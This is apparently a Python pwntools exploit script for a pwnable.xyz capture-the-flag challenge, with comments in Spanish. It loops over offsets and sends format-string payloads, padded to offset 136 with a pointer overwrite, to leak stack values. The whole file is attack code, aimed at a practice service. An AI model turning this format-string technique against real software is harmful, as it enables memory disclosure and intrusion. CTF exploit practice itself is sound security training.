#!/usr/bin/env python3

from pwn import *

for n in range(1, 20):
    conn = remote('svc.pwnable.xyz', 30004)
    
    conn.recvuntil(b'[y/N]: ')
    conn.sendline(b'y')
    
    conn.recvuntil(b'Name: ')
    
    # Poner formato en usr y sobrescribir el formato string
    # usr: formato string
    # offset 136: sobrescribe el formato string de printf
    
    # Payload: formato que lee el stack + padding + puntero a usr
    fmt = f'%{n}$p.'.encode()
    payload = fmt + b'A' * (136 - len(fmt)) + p64(0x6010e0)[:4]  # Solo los primeros 4 bytes sin nulls
    
    conn.sendline(payload)
    
    data = conn.recvall(timeout=2)
    
    if b'0x' in data:
        log.info(f"N={n}: {data}")
    
    conn.close()
    
    if n % 5 == 0:
        time.sleep(0.5)